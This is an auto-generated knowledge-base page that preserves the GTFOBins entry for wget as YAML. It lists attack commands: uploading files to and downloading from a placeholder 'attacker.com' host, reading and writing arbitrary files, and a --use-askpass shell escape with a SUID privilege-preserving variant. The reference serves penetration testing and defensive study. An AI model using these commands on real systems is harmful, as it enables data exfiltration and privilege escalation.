---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# wget

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `wget` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/wget` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [wget](../../tools/linux/wget.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | wget |
| name | wget |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/wget/ |

## Preserved Source Material

```yaml
_body: ''
_name: wget
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/wget
functions:
  download:
  - code: wget http://attacker.com/path/to/input-file -O /path/to/output-file
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    sender: http-server
  file-read:
  - binary: false
    code: wget -i /path/to/input-file
    comment: The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content
      appears, somewhat modified, as error messages.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  file-write:
  - code: wget -i /path/to/input-file -o /path/to/output-file
    comment: The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content
      appears, somewhat modified, as error messages.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  shell:
  - code: 'echo -e ''#!/bin/sh\n/bin/sh 1>&0'' >/path/to/temp-file

      chmod +x /path/to/temp-file

      wget --use-askpass=/path/to/temp-file 0'
    contexts:
      sudo: null
      suid:
        code: 'echo -e ''#!/bin/sh -p\n/bin/sh -p 1>&0'' >/path/to/temp-file

          chmod +x /path/to/temp-file

          wget --use-askpass=/path/to/temp-file 0'
        shell: false
      unprivileged: null
  upload:
  - code: wget --post-file=/path/to/input-file http://attacker.com
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    receiver: http-server
  - code: wget --post-data=DATA http://attacker.com
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    receiver: http-server
```
